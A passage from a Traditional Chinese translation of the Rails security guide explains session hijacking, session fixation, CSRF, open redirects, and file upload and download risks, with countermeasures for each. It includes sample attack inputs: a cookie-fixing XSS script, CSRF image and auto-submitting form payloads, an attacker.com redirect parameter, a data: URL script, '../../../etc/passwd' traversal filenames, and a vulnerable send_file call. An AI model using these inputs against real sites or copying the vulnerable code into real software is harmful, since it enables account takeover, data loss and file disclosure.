**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**, original file md5: f769f3ad2ac56ac5949224832c8307e3
保護Rails應用程式
=================

本手冊描述了網路應用程式中常見的安全問題，以及如何在Rails中避免這些問題。

閱讀完本指南後，您將了解：

* 所有被突顯出來的對策。
* Rails中的session概念，以及在其中放置什麼和常見的攻擊方法。
* 只是訪問一個網站可能成為安全問題的原因（CSRF）。
* 在處理檔案或提供管理介面時需要注意的事項。
* 如何管理使用者：登入和登出以及在所有層面上的攻擊方法。
* 最常見的注入攻擊方法。

--------------------------------------------------------------------------------

介紹
----

網路應用程式框架旨在幫助開發人員建立網路應用程式。其中一些框架也可以幫助您保護網路應用程式。事實上，一個框架並不比另一個更安全：如果您正確使用它，您將能夠使用許多框架建立安全的應用程式。Ruby on Rails具有一些巧妙的輔助方法，例如防止SQL注入，因此這幾乎不是一個問題。

一般來說，並不存在即插即用的安全性。安全性取決於使用框架的人，有時也取決於開發方法。它還取決於網路應用程式環境的所有層面：後端儲存、網路伺服器和網路應用程式本身（以及可能的其他層面或應用程式）。

然而，Gartner集團估計，75％的攻擊發生在網路應用程式層，並發現“在300個審計網站中，97％容易受到攻擊”。這是因為網路應用程式相對容易受到攻擊，因為它們易於理解和操作，即使是非專業人士也能夠做到。

對網路應用程式的威脅包括使用者帳戶劫持、繞過存取控制、讀取或修改敏感資料，或呈現虛假內容。攻擊者也可能能夠安裝特洛伊木馬程式或垃圾郵件發送軟體，以追求財務利益，或通過修改公司資源來造成品牌損害。為了防止攻擊，減少其影響並消除攻擊點，首先，您必須完全了解攻擊方法，以找到正確的對策。這就是本指南的目的。

為了開發安全的網路應用程式，您必須保持各個層面的最新資訊，並了解您的敵人。訂閱安全郵件列表、閱讀安全部落格，並將更新和安全檢查變成習慣（請參閱[附加資源](#additional-resources)章節）。這是手動完成的，因為這樣才能找到令人討厭的邏輯安全問題。

Sessions
--------

本章描述了與session相關的一些特定攻擊，以及保護session資料的安全措施。

### 什麼是Sessions？

INFO: Sessions使應用程式能夠在使用者與應用程式互動時保持特定於使用者的狀態。例如，sessions允許使用者進行一次身份驗證，並在未來的請求中保持登入狀態。

大多數應用程式需要跟踪與應用程式互動的使用者的狀態。這可能是購物籃的內容，或者是當前登入使用者的使用者ID。這種特定於使用者的狀態可以存儲在session中。

Rails為訪問應用程式的每個使用者提供一個session物件。如果使用者已經有一個活動的session，Rails將使用現有的session。否則，將創建一個新的session。

NOTE: 有關session及其使用方法的更多資訊，請參閱[Action Controller概述指南](action_controller_overview.html#session)。

### Session劫持

WARNING: _竊取使用者的session ID使攻擊者能夠以受害者的名義使用網路應用程式。_

許多網路應用程式都有一個身份驗證系統：使用者提供用戶名和密碼，網路應用程式檢查它們並將相應的使用者ID存儲在session哈希中。從現在開始，session是有效的。在每個請求中，應用程式將載入使用者（使用session中的使用者ID進行識別），而無需進行新的身份驗證。cookie中的session ID識別session。

因此，cookie作為網路應用程式的臨時身份驗證。任何竊取他人的cookie的人都可以以該使用者的身份使用網路應用程式，可能會造成嚴重後果。以下是一些劫持session的方法及其對策：
* 在不安全的網絡中嗅探cookie。無線局域網可以是這樣一個網絡的例子。在未加密的無線局域網中，監聽所有連接的客戶端的流量尤其容易。對於網絡應用程序建構者來說，這意味著要在應用程序配置文件中提供一個安全的SSL連接：

    ```ruby
    config.force_ssl = true
    ```

* 大多數人在使用公共終端後不清除cookie。因此，如果上一個用戶沒有從網絡應用程序中登出，您將能夠以該用戶身份使用它。在網絡應用程序中為用戶提供一個"登出"按鈕，並使其顯著。

* 許多跨站腳本（XSS）攻擊旨在獲取用戶的cookie。您將在稍後閱讀有關XSS的更多信息。

* 攻擊者不是偷取攻擊者不知道的cookie，而是修復攻擊者知道的用戶會話標識符（在cookie中）。稍後閱讀更多關於這種所謂的會話固定的信息。

大多數攻擊者的主要目標是賺錢。根據[Symantec互聯網安全威脅報告（2017）](https://docs.broadcom.com/docs/istr-22-2017-en)，被盜銀行登錄帳戶的地下價格範圍為帳戶餘額的0.5％-10％，信用卡號碼的0.5美元-30美元（完整詳細信息為20美元-60美元），身份（姓名，社會安全號碼和出生日期）的0.1美元-1.5美元，零售商帳戶的20美元-50美元，以及雲服務提供商帳戶的6美元-10美元。

### 會話存儲

注意：Rails使用`ActionDispatch::Session::CookieStore`作為默認的會話存儲。

提示：在[Action Controller概述指南](action_controller_overview.html#session)中了解更多關於其他會話存儲的信息。

Rails的`CookieStore`將會話哈希保存在客戶端的cookie中。
服務器從cookie中檢索會話哈希並
消除了對會話ID的需求。這將大大提高
應用程序的速度，但這是一個有爭議的存儲選項，並且
您必須考慮其安全性和存儲限制：

* cookie有4 kB的大小限制。僅將與會話有關的數據存儲在cookie中。

* cookie存儲在客戶端。客戶端可能會保留cookie內容，即使cookie已過期。客戶端可能會將cookie複製到其他計算機上。避免在cookie中存儲敏感數據。

* cookie本質上是臨時的。服務器可以為cookie設置到期時間，但客戶端可能在此之前刪除cookie及其內容。將所有較持久的數據保存在服務器端。

* 會話cookie不會自動失效，並且可能被惡意重用。建議您的應用程序使用存儲的時間戳來使舊的會話cookie失效。

* Rails默認加密cookie。客戶端無法讀取或編輯cookie的內容，而不會破壞加密。如果您妥善保管您的密鑰，則可以認為cookie基本上是安全的。

`CookieStore`使用
[encrypted](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)
cookie jar提供安全的加密位置來存儲會話
數據。基於cookie的會話因此提供完整性和
對其內容的機密性。加密密鑰以及用於
[signed](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed)
cookie的驗證密鑰都來自`secret_key_base`配置值。

提示：密鑰必須長且隨機。使用`bin/rails secret`獲取新的唯一密鑰。

信息：在本指南的稍後部分了解有關[管理憑據的更多信息](security.html#custom-credentials)

同樣重要的是為加密和
簽名cookie使用不同的salt值。將不同的salt配置值用於相同的值可能導致相同的衍生密鑰用於不同的安全功能，這可能削弱密鑰的強度。

在測試和開發應用程序中，從應用程序名稱派生`secret_key_base`。其他環境必須使用`config/credentials.yml.enc`中的隨機密鑰，如下所示（解密狀態）：

```yaml
secret_key_base: 492f...
```

警告：如果您的應用程序的密鑰可能已經曝光，強烈考慮更改它們。請注意，更改`secret_key_base`將使當前活動會話失效，並要求所有用戶重新登錄。除了會話數據外，加密cookie、簽名cookie和Active Storage文件也可能受到影響。

### 輪換加密和簽名cookie配置

輪換是更改cookie配置並確保舊cookie
不會立即失效的理想方式。然後，您的用戶有機會訪問您的網站，
使用舊配置讀取其cookie，並使用新更改重新編寫cookie。
一旦您對用戶有足夠的信心已經有機會升級他們的cookie，則可以刪除輪換。

可以將用於加密和簽署的cookie的密碼和摘要進行旋轉。

例如，要將用於簽署cookie的摘要從SHA1更改為SHA256，首先要分配新的配置值：

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

現在添加一個旋轉，將舊的SHA1摘要升級到新的SHA256摘要，以便現有的cookie可以無縫地升級。

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

然後，任何寫入的簽署cookie都將使用SHA256進行摘要。使用SHA1寫入的舊cookie仍然可以讀取，如果訪問，將使用新的摘要進行寫入，以便升級並在刪除旋轉時不會無效。

一旦使用SHA1摘要的簽署cookie的用戶不再有機會重寫他們的cookie，則可以刪除旋轉。

雖然您可以設置任意多個旋轉，但通常不會同時進行多個旋轉。

有關使用加密和簽署消息進行密鑰旋轉的更多詳細信息以及“rotate”方法接受的各種選項，請參閱[MessageEncryptor API](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html)和[MessageVerifier API](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html)文檔。

### CookieStore會話的重放攻擊

提示：_使用CookieStore時，您還必須注意重放攻擊。_

它的工作原理如下：

* 用戶收到信用額度，金額存儲在會話中（這本來就是一個壞主意，但出於演示目的，我們將這樣做）。
* 用戶購買東西。
* 新的調整後的信用值存儲在會話中。
* 用戶從第一步（之前複製的）中取出cookie，並替換瀏覽器中的當前cookie。
* 用戶恢復原始信用額度。

在會話中包含一個nonce（一個隨機值）可以解決重放攻擊。nonce只能使用一次，服務器必須跟踪所有有效的nonce。如果您有多個應用程序服務器，情況會變得更加複雜。將nonce存儲在數據庫表中將擊敗CookieStore的整個目的（避免訪問數據庫）。

最好的解決方案是_不要將此類數據存儲在會話中，而是存儲在數據庫中_。在這種情況下，將信用存儲在數據庫中，將`logged_in_user_id`存儲在會話中。

### 會話固定

注意：_除了竊取用戶的會話ID外，攻擊者還可以固定他們已知的會話ID。這稱為會話固定。_

![會話固定](images/security/session_fixation.png)

此攻擊專注於固定攻擊者已知的用戶會話ID，並強制用戶的瀏覽器使用此ID。因此，攻擊者之後無需竊取會話ID。以下是此攻擊的工作原理：

* 攻擊者創建一個有效的會話ID：他們加載他們想要固定會話的Web應用程序的登錄頁面，並從響應中獲取cookie中的會話ID（參見圖片中的1和2號）。
* 他們通過定期訪問Web應用程序來維持會話，以保持即將過期的會話活躍。
* 攻擊者強制用戶的瀏覽器使用此會話ID（參見圖片中的3號）。由於不能更改另一個域的cookie（由於同源策略），攻擊者必須從目標Web應用程序的域運行JavaScript。通過XSS將JavaScript代碼注入應用程序來實現此攻擊。這是一個示例：`<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。稍後閱讀有關XSS和注入的更多信息。
* 攻擊者誘導受害者訪問帶有JavaScript代碼的受感染頁面。通過查看該頁面，受害者的瀏覽器將將會話ID更改為陷阱會話ID。
* 由於新的陷阱會話未使用，Web應用程序將要求用戶進行身份驗證。
* 從現在開始，受害者和攻擊者將共同使用相同的會話使用Web應用程序：會話變得有效，受害者並未注意到攻擊。

### 會話固定 - 對策

提示：_一行代碼將保護您免受會話固定攻擊。_

最有效的對策是_在成功登錄後發行一個新的會話標識符_，並宣布舊的標識符無效。這樣，攻擊者無法使用固定的會話標識符。這也是對抗會話劫持的良好對策。以下是在Rails中創建新會話的方法：
```ruby
reset_session
```

如果您使用流行的[Devise](https://rubygems.org/gems/devise) gem進行使用者管理，它會自動在登入和登出時使會話過期。如果您自己開發，請記得在登入動作（建立會話時）後使會話過期。這將從會話中刪除值，因此_您必須將它們轉移到新的會話中_。

另一個對策是_將使用者特定屬性保存在會話中_，每次請求到來時驗證它們，如果信息不符合則拒絕訪問。這些屬性可以是遠程IP地址或用戶代理（網頁瀏覽器名稱），儘管後者不太具體。在保存IP地址時，您必須牢記有些互聯網服務提供商或大型組織會將其用戶放在代理後面。_這些可能會在會話期間更改_，因此這些用戶將無法使用您的應用程序，或者只能以有限的方式使用。

### 會話過期

注意：_永不過期的會話會延長跨站請求偽造（CSRF）、會話劫持和會話固定等攻擊的時間窗口_。

一種可能性是設置帶有會話ID的cookie的過期時間戳。然而，客戶端可以編輯在網頁瀏覽器中存儲的cookie，因此在服務器上使會話過期更安全。以下是如何_在數據庫表中使會話過期_的示例。調用`Session.sweep(20.minutes)`以使使用時間超過20分鐘的會話過期。

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end
```

有關會話固定的部分介紹了維持會話的問題。攻擊者每隔五分鐘維持一個會話，可以使會話永遠保持活躍，儘管您正在使會話過期。對於這個問題的一個簡單解決方案是在會話表中添加一個`created_at`列。現在，您可以刪除很久之前創建的會話。在上面的sweep方法中使用以下行：

```ruby
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all
```

跨站請求偽造（CSRF）
---------------------------------

這種攻擊方法通過在訪問用戶被認為已驗證的網頁應用程序的頁面中包含惡意代碼或鏈接來進行。如果該網頁應用程序的會話尚未超時，攻擊者可能執行未經授權的命令。

![跨站請求偽造](images/security/csrf.png)

在[會話章節](#sessions)中，您已經了解到大多數Rails應用程序使用基於cookie的會話。它們要麼將會話ID存儲在cookie中並具有服務器端會話哈希，要麼整個會話哈希位於客戶端。在任何情況下，如果瀏覽器能夠找到該域的cookie，它將自動在每個請求中附帶該cookie。爭議點在於，如果請求來自不同域的站點，它也將附帶該cookie。讓我們從一個例子開始：

* Bob瀏覽一個留言板，並查看一個黑客發布的帖子，其中有一個精心製作的HTML圖像元素。該元素引用Bob的項目管理應用程序中的一個命令，而不是圖像文件：`<img src="http://www.webapp.com/project/1/destroy">`
* Bob在`www.webapp.com`的會話仍然有效，因為他幾分鐘前沒有登出。
* 通過查看帖子，瀏覽器找到了一個圖像標籤。它嘗試從`www.webapp.com`加載懷疑的圖像。如前所述，它還將帶有有效會話ID的cookie一起發送。
* `www.webapp.com`上的網頁應用程序驗證相應會話哈希中的用戶信息並銷毀ID為1的項目。然後返回一個對瀏覽器來說是意外結果的結果頁面，因此它不會顯示圖像。
* Bob沒有注意到這次攻擊，但幾天後他發現項目編號一消失了。

需要注意的是，實際的精心製作的圖像或鏈接不一定要位於網頁應用程序的域中，它可以位於任何地方 - 在論壇、博客帖子或電子郵件中。

CSRF在CVE（通用漏洞和公開漏洞）中出現的頻率非常低 - 2006年不到0.1% - 但它確實是一個“沉睡的巨人”[Grossman]。這與許多安全合同工作的結果形成鮮明對比 - _CSRF是一個重要的安全問題_。
### CSRF 對策

注意：首先，根據 W3C 的要求，適當使用 GET 和 POST。其次，在非 GET 請求中使用安全令牌可以保護應用程式免受 CSRF 攻擊。

#### 適當使用 GET 和 POST

HTTP 協議基本上提供了兩種主要的請求類型 - GET 和 POST（DELETE、PUT 和 PATCH 應該像 POST 一樣使用）。世界廣泛網路聯盟（W3C）提供了一個選擇 HTTP GET 或 POST 的檢查清單：

**如果符合以下情況，請使用 GET：**

* 互動更像是一個問題（即安全操作，例如查詢、讀取操作或查找）。

**如果符合以下情況，請使用 POST：**

* 互動更像是一個訂單，或
* 互動會以某種方式改變資源的狀態，使用者會察覺到（例如訂閱服務），或
* 使用者對互動的結果負有責任。

如果您的網頁應用程式是符合 RESTful 的，您可能已經習慣使用其他 HTTP 動詞，例如 PATCH、PUT 或 DELETE。然而，一些舊版的網頁瀏覽器不支援這些動詞 - 只支援 GET 和 POST。Rails 使用隱藏的 `_method` 欄位來處理這些情況。

_POST 請求也可以自動發送_。在這個例子中，連結 www.harmless.com 在瀏覽器的狀態列中顯示為目的地。但實際上它動態地創建了一個新的表單，並發送了一個 POST 請求。

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">前往無害調查</a>
```

或者攻擊者將代碼放入圖像的 onmouseover 事件處理程序中：

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

還有許多其他可能性，例如使用 `<script>` 標籤對具有 JSONP 或 JavaScript 響應的 URL 發出跨站請求。響應是攻擊者可以找到一種運行的可執行代碼，可能提取敏感資料。為了防止此資料洩漏，我們必須禁止跨站 `<script>` 標籤。然而，Ajax 請求遵循瀏覽器的同源政策（只允許您自己的網站發起 `XmlHttpRequest`），因此我們可以安全地允許它們返回 JavaScript 響應。

注意：我們無法區分 `<script>` 標籤的來源 - 它是您自己網站上的標籤還是其他惡意網站上的標籤，因此我們必須全面阻止所有 `<script>`，即使它實際上是從您自己的網站提供的安全同源腳本。在這些情況下，明確地跳過針對為 `<script>` 標籤提供 JavaScript 的 CSRF 保護。

#### 必要的安全令牌

為了防止所有其他偽造的請求，我們引入了一個我們的網站知道但其他網站不知道的 _必要的安全令牌_。我們在請求中包含安全令牌並在伺服器上驗證它。當 [`config.action_controller.default_protect_from_forgery`][] 設置為 `true` 時，這將自動完成，這是新建 Rails 應用程式的預設值。您也可以通過在應用程式控制器中添加以下內容來手動完成：

```ruby
protect_from_forgery with: :exception
```

這將在 Rails 生成的所有表單中包含一個安全令牌。如果安全令牌與預期的不符，將拋出一個例外。

使用 [Turbo](https://turbo.hotwired.dev/) 提交表單時，也需要安全令牌。Turbo 在您的應用程式佈局的 `csrf` meta 標籤中尋找該令牌，並將其添加到 `X-CSRF-Token` 請求標頭中。這些 meta 標籤是使用 [`csrf_meta_tags`][] 輔助方法創建的：

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

生成的結果如下：

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>
```

從 JavaScript 發送自己的非 GET 請求時，也需要安全令牌。[Rails Request.JS](https://github.com/rails/request.js) 是一個封裝了添加所需請求標頭邏輯的 JavaScript 函式庫。

使用其他庫進行 Ajax 請求時，需要自己將安全令牌添加為默認標頭。要從 meta 標籤中獲取令牌，您可以執行以下操作：

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### 清除持久性 Cookie

通常使用持久性 Cookie 存儲使用者資訊，例如使用 `cookies.permanent`。在這種情況下，Cookie 不會被清除，並且開箱即用的 CSRF 保護將無效。如果您在此資訊中使用的是不同的 Cookie 存儲，則必須自行處理該資訊的處理方式：
```ruby
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # 例子中的方法將銷毀使用者的 cookies
end
```

上述方法可以放在 `ApplicationController` 中，當在非 GET 請求中沒有 CSRF token 或者 CSRF token 不正確時，該方法將被調用。

請注意，_跨站腳本 (XSS) 漏洞將繞過所有 CSRF 保護_。XSS 讓攻擊者可以訪問頁面上的所有元素，因此他們可以從表單中讀取 CSRF 安全令牌或直接提交表單。稍後閱讀有關 XSS 的[更多資訊](#cross-site-scripting-xss)。

重定向和文件
---------------------

另一類安全漏洞涉及重定向和文件在 Web 應用程序中的使用。

### 重定向

警告：_Web 應用程序中的重定向是一種被低估的駭客工具：攻擊者不僅可以將用戶轉到陷阱網站，還可以創建一個自包含的攻擊_。

每當允許用戶傳遞（部分）URL 進行重定向時，可能存在漏洞。最明顯的攻擊是將用戶重定向到看起來和原始網站完全相同的假網站。這種所謂的釣魚攻擊通過在電子郵件中向用戶發送一個不可疑的鏈接，通過 XSS 在 Web 應用程序中注入鏈接，或者將鏈接放入外部網站中實現。它是不可疑的，因為該鏈接以 Web 應用程序的 URL 開頭，並且惡意站點的 URL 在重定向參數中被隱藏：http://www.example.com/site/redirect?to=www.attacker.com。這是一個遺留操作的示例：

```ruby
def legacy
  redirect_to(params.update(action: 'main'))
end
```

這將在用戶嘗試訪問遺留操作時將用戶重定向到主操作。意圖是保留 URL 參數到遺留操作並將它們傳遞到主操作。然而，如果攻擊者在 URL 中包含了主機鍵，它可以被利用：

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

如果它在 URL 的末尾，它幾乎不會被注意到，並將用戶重定向到 `attacker.com` 主機。作為一般規則，將用戶輸入直接傳遞給 `redirect_to` 被認為是危險的。一個簡單的對策是_僅包含預期的參數在遺留操作中_（再次是允許列表方法，而不是刪除意外的參數）。_如果你重定向到一個 URL，請用允許列表或正則表達式檢查它_。

#### 自包含的 XSS

Firefox 和 Opera 中的另一種重定向和自包含的 XSS 攻擊是使用數據協議。該協議直接在瀏覽器中顯示其內容，可以是從 HTML 或 JavaScript 到整個圖像的任何內容：

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

這個例子是一個 Base64 編碼的 JavaScript，顯示一個簡單的消息框。在重定向 URL 中，攻擊者可以將惡意代碼重定向到這個 URL。作為對策，_不要允許用戶提供（部分）要重定向到的 URL_。

### 文件上傳

注意：_確保文件上傳不會覆蓋重要文件，並異步處理媒體文件_。

許多 Web 應用程序允許用戶上傳文件。_用戶可以選擇（部分）的文件名應始終過濾_，因為攻擊者可以使用惡意文件名覆蓋服務器上的任何文件。如果您將文件上傳存儲在 /var/www/uploads，並且用戶輸入了類似 "../../../etc/passwd" 的文件名，它可能會覆蓋一個重要文件。當然，Ruby 解釋器需要適當的權限才能這樣做 - 這是將 Web 服務器、數據庫服務器和其他程序運行為權限較低的 Unix 用戶的另一個原因。

在過濾用戶輸入的文件名時，_不要試圖刪除惡意部分_。想像一下這樣一種情況，Web 應用程序刪除文件名中的所有 "../"，而攻擊者使用像 "....//" 這樣的字符串 - 結果將是 "../"。最好使用允許列表方法，_使用一組接受的字符檢查文件名的有效性_。這與受限列表方法相對，後者試圖刪除不允許的字符。如果它不是有效的文件名，拒絕它（或替換不被接受的字符），但不要刪除它們。這是 [attachment_fu 插件](https://github.com/technoweenie/attachment_fu/tree/master) 中的文件名清理器示例：

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # 注意：File.basename 在 Unix 上無法正確處理 Windows 路徑
    # 只獲取文件名，而不是整個路徑
    name.sub!(/\A.*(\\|\/)/, '')
    # 最後，將所有非字母數字、下劃線或句點替換為下劃線
    name.gsub!(/[^\w.-]/, '_')
  end
end
```

同步處理檔案上傳（如`attachment_fu`插件可能用於圖片）的一個重大缺點是它對拒絕服務攻擊的脆弱性。攻擊者可以從多台計算機同步開始圖片檔案上傳，從而增加伺服器負載，最終可能導致伺服器崩潰或停頓。

解決這個問題的最佳方法是_異步處理媒體檔案_：將媒體檔案保存並在數據庫中安排一個處理請求。第二個進程將在後台處理檔案的處理。

### 檔案上傳中的可執行代碼

警告：_在特定目錄中放置上傳檔案時，可能會執行上傳檔案中的源代碼。如果Apache的主目錄是Rails的/public目錄，請勿將檔案上傳到其中。_

流行的Apache Web伺服器有一個名為DocumentRoot的選項。這是網站的主目錄，該目錄樹中的所有內容都將由Web伺服器提供。如果有某些特定檔案擴展名的檔案，當請求時，其中的代碼將被執行（可能需要設置一些選項）。例如，PHP和CGI檔案就是這樣。現在想像一個情況，攻擊者上傳了一個名為"file.cgi"的檔案，其中包含當有人下載該檔案時將被執行的代碼。

_如果您的Apache DocumentRoot指向Rails的/public目錄，請勿將檔案上傳到其中_，至少將檔案存儲在上一級目錄中。

### 檔案下載

注意：_確保用戶無法下載任意檔案。_

就像您必須對上傳的檔案名進行過濾一樣，您也必須對下載的檔案名進行過濾。`send_file()`方法將檔案從伺服器發送到客戶端。如果您使用用戶輸入的檔案名而不進行過濾，則可以下載任意檔案：

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

只需傳遞一個檔案名，例如"../../../etc/passwd"，即可下載伺服器的登錄信息。對此的一個簡單解決方案是_檢查所請求的檔案是否在預期的目錄中_：

```ruby
basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: 'inline'
```

另一種（附加的）方法是將檔案名存儲在數據庫中，並將檔案在磁碟上命名為數據庫中的ID。這也是一種避免上傳檔案中可能執行的代碼的好方法。`attachment_fu`插件以類似的方式實現了這一點。

使用者管理
---------------

注意：_幾乎每個 Web 應用程序都需要處理授權和身份驗證。建議使用常見的插件，而且也要保持它們的最新狀態。一些額外的預防措施可以使您的應用程序更加安全。_

Rails有許多可用的身份驗證插件。好的插件，如流行的[devise](https://github.com/heartcombo/devise)和[authlogic](https://github.com/binarylogic/authlogic)，僅存儲加密哈希的密碼，而不是明文密碼。自Rails 3.1以來，您還可以使用內置的[`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password)方法，該方法支持安全的密碼哈希、確認和恢復機制。

### 暴力破解帳戶

注意：_對帳戶進行暴力破解是一種基於試錯的登錄憑證攻擊。通過更通用的錯誤訊息和可能要求輸入CAPTCHA來防禦它們。_

您的 Web 應用程序的用戶名列表可能被濫用來對應的密碼進行暴力破解，因為大多數人不使用復雜的密碼。大多數密碼是字典詞和可能的數字的組合。因此，擁有用戶名列表和字典，自動程序可以在幾分鐘內找到正確的密碼。

因此，大多數 Web 應用程序將顯示一個通用的錯誤訊息"用戶名或密碼不正確"，如果其中一個不正確。如果它說"您輸入的用戶名未找到"，攻擊者可以自動編制一個用戶名列表。

然而，大多數 Web 應用程序設計者忽略了忘記密碼頁面。這些頁面通常承認輸入的用戶名或電子郵件地址是否（不）被找到。這使得攻擊者可以編制一個用戶名列表並對帳戶進行暴力破解。

為了減輕此類攻擊，_在忘記密碼頁面上顯示一個通用的錯誤訊息_。此外，您可以_要求在某個IP地址上連續多次失敗登錄後輸入CAPTCHA_。然而，請注意，這並不是對抗自動程序的絕對解決方案，因為這些程序可能會經常更改其IP地址。然而，它提高了攻擊的門檻。
### 帳戶劫持

許多網路應用程式容易被劫持使用者帳戶。為什麼不做些不同的事情，讓它變得更困難呢？

#### 密碼

想像一個情境，攻擊者竊取了使用者的會話 Cookie，因此可以共同使用應用程式。如果更改密碼很容易，攻擊者只需點擊幾下就能劫持帳戶。或者，如果更改密碼的表單容易受到 CSRF 攻擊，攻擊者可以誘導受害者前往一個網頁，該網頁中有一個特製的 IMG 標籤，該標籤會執行 CSRF 攻擊。作為對策，當然要「使更改密碼的表單對抗 CSRF」，並且「在更改密碼時要求使用者輸入舊密碼」。

#### 電子郵件

然而，攻擊者也可以通過更改電子郵件地址來接管帳戶。他們更改後，將前往忘記密碼頁面，(可能是新的)密碼將被發送到攻擊者的電子郵件地址。作為對策，「在更改電子郵件地址時要求使用者輸入密碼」。

#### 其他

根據您的網路應用程式，可能有更多劫持使用者帳戶的方法。在許多情況下，CSRF 和 XSS 可以幫助實現這一點。例如，像在[Google Mail](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/)中的 CSRF 漏洞。在這個概念驗證攻擊中，受害者會被誘導前往攻擊者控制的網站。該網站上有一個特製的 IMG 標籤，該標籤會導致一個 HTTP GET 請求，從而更改 Google Mail 的過濾器設置。如果受害者已經登錄到 Google Mail，攻擊者將更改過濾器，將所有電子郵件轉發到他們的電子郵件地址。這幾乎和完全劫持帳戶一樣嚴重。作為對策，「檢查您的應用程式邏輯，並消除所有 XSS 和 CSRF 漏洞」。

### CAPTCHA

資訊：CAPTCHA 是一種挑戰-回應測試，用於確定回應不是由電腦生成的。它通常用於通過要求使用者輸入扭曲圖像中的字母來保護註冊表單免受攻擊者和評論表單免受自動垃圾郵件機器人的攻擊。這是正向 CAPTCHA，但也有負向 CAPTCHA。負向 CAPTCHA 的概念不是要求使用者證明他們是人類，而是揭示機器人是機器人。

一個受歡迎的正向 CAPTCHA API 是 [reCAPTCHA](https://developers.google.com/recaptcha/)，它顯示兩個扭曲的單詞圖像，這些圖像來自舊書。它還添加了一條傾斜的線條，而不是以前的 CAPTCHA 中的扭曲背景和高度扭曲的文字，因為後者已經被破解。作為額外的好處，使用 reCAPTCHA 有助於數字化舊書。[ReCAPTCHA](https://github.com/ambethia/recaptcha/) 也是一個同名的 Rails 插件。

您將從 API 獲得兩個金鑰，一個是公鑰，一個是私鑰，您需要將它們放入您的 Rails 環境中。之後，您可以在視圖中使用 recaptcha_tags 方法，在控制器中使用 verify_recaptcha 方法。如果驗證失敗，verify_recaptcha 將返回 false。
CAPTCHA 的問題在於它對使用者體驗有負面影響。此外，一些視力受損的使用者發現某些類型的扭曲 CAPTCHA 難以閱讀。儘管如此，正向 CAPTCHA 是防止各種類型的機器人提交表單的最佳方法之一。

大多數機器人都非常幼稚。它們爬行網路並將垃圾郵件放入它們能找到的每個表單字段中。負向 CAPTCHA 利用這一點，在表單中包含一個「蜜罐」字段，該字段將被 CSS 或 JavaScript 隱藏，以防止人類使用者看到。

請注意，負向 CAPTCHA 只對幼稚的機器人有效，無法保護關鍵應用程式免受針對性機器人的攻擊。儘管如此，正向和負向 CAPTCHA 可以結合使用以提高性能，例如，如果「蜜罐」字段不為空（檢測到機器人），則無需驗證正向 CAPTCHA，這將需要在計算回應之前向 Google ReCaptcha 發送 HTTPS 請求。

以下是一些如何通過 JavaScript 和/或 CSS 隱藏「蜜罐」字段的想法：

- 將字段定位在頁面的不可見區域
- 使元素非常小或將其顏色設置為頁面的背景相同
- 保持字段顯示，但告訴人類將其留空
最簡單的負面CAPTCHA是一個隱藏的蜜罐欄位。在伺服器端，您將檢查欄位的值：如果它包含任何文字，則必定是機器人。然後，您可以忽略該貼文或返回一個正面結果，但不將該貼文保存到資料庫中。這樣機器人就會滿意並繼續前進。

您可以在Ned Batchelder的[博客文章](https://nedbatchelder.com/text/stopbots.html)中找到更複雜的負面CAPTCHA：

* 在欄位中包含當前的UTC時間戳，並在伺服器端進行檢查。如果時間戳過去太久，或者在未來，則表單無效。
* 隨機化欄位名稱
* 包含多個蜜罐欄位，包括提交按鈕

請注意，這只能保護您免受自動機器人的攻擊，針對特定定制的機器人無法通過此方式停止。因此，負面CAPTCHA可能不適合保護登錄表單。

### 日誌記錄

警告：_告訴Rails不要將密碼記錄到日誌文件中。_

預設情況下，Rails會記錄所有發送到網絡應用程序的請求。但是，日誌文件可能會帶來嚴重的安全問題，因為它們可能包含登錄憑證、信用卡號碼等敏感信息。在設計網絡應用程序安全概念時，您還應該考慮如果攻擊者（完全）獲得了對網絡服務器的訪問權限會發生什麼。如果日誌文件明確列出了明文的密碼和機密信息，那麼在數據庫中加密密碼和機密信息將毫無用處。您可以通過將它們添加到應用程序配置中的[`config.filter_parameters`][]來從日誌文件中過濾某些請求參數。這些參數將在日誌中標記為[FILTERED]。

```ruby
config.filter_parameters << :password
```

注意：提供的參數將通過部分匹配的正則表達式進行過濾。Rails會在適當的初始化器（`initializers/filter_parameter_logging.rb`）中添加一個包含`：passw`、`：secret`和`：token`等預設過濾器的列表，以處理像`password`、`password_confirmation`和`my_token`等典型應用程序參數。

### 正則表達式

信息：_在Ruby的正則表達式中，常見的錯誤是使用^和$來匹配字符串的開頭和結尾，而不是使用\A和\z。_

